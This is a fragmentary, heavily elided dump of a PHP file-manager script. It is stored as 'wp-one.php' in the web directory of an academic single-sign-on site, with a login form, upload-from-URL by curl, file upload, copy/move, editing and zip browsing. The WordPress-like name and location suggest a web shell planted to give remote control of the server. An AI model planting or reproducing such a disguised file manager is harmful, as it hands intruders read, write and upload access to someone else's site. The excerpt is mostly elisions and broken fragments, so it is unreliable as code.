...
Full Path: /home/cbtstisiac/sso.cbt.stisi.ac.id/wp-one.php
File size: 169.32 KB
                        ...
                        <div class="card fat <?PHp echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button"><?PHp echo lng('>>'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
...
if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
    ...
    if(isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
        ...
        if (!$url) {
            ...
            if (!$success) {$err = array("message" => curl_error($ch));
            }
            @curl_close($ch);
            fclose($fp);
...
if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) && !FM_READONLY) {
    ...
    if (is_array($files) && count($files)) {
        ...
        if ($errors == 0) {
            $msg = $move ? 'Selected files and foldersmoved' : 'Selected files and folders copied';
            fm_set_msg($msg);
        } else {
...
if (!empty($_FILES) && !FM_READONLY) {
    ...
    if ( is_writable($targetPath) ) {
        ...
        if (empty($f['file']['error']) && !empty($tmp_name) && $tmp_name != 'none' && $isFileAllowed) {if ($chunkTotal){
                ...
                if ($out) {
                    ...
                    if ($in) {
                        ...
                        } else {stream_copy_to_stream($in, $out);
                        }
                        $response = array (
                            'status'    => 'success',
        ...
        <div class="card <?php echo fm_get_theme(); ?>">
            ...
            <div class="card-body">
                <form action="" method="post">
                    ...
                    <p><b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
...
if (isset($_GET['view'])) {
    ...
    ?>
    <div class="row">
        <div class="col-12"><p class="break-word"><b><?php echo lng($view_title) ?> "<?php echo fm_enc(fm_convert_win($file)) ?>"</b></p>
            <p class="break-word">
            ...
            if($is_onlineViewer) {
                ...
                } else if($online_viewer == 'microsoft') {echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fm_enc($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                }
            } elseif ($is_zip) {
                if ($filenames !== false) {
            ...
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                ...
                <?php if ($is_text) { ?>
                    ...
                    <?php } else { ?>
                        ...
                        <button type="button" class="btn btn-smbtn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save') ?>
                        </button>
                    <?php } ?>
                <?php } ?>
            </div>
        ...
        <table class="table table-bordered table-hover table-sm <?php echo $tableTheme; ?>" id="main-table">
            ...
            foreach ($folders as $f) {
                ...
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    ...
                    if ($owner === false) {$owner = array('name' => '?');
                    }
                    if ($group === false) {
                        $group = array('name' => '?');
                    }
                ...
                <tr>
                    ...
                    <td data-sort=<?php echo fm_enc($f) ?>>
                        ...
                        <?php
                           ...
                           <?php else: ?>
                                <a href="<?php echo $filelink ?>" title="<?php echo $f ?>"><?php endif; ?>
        ...
        if ($arch) {
            ...
            while ($zip_entry = @zip_read($arch)) {
                ...
                $filenames[] = array(
                    ...
                    'compressed_size' => @zip_entry_compressedsize($zip_entry),'folder' => $zip_folder
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            if (substr($fm_url, -1) == '/') {$fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <style>
        ...
        *,*::before,*::after { box-sizing: border-box;}
        ...
        .break-word + .float-right { padding-right:30px;position:relative  }.break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
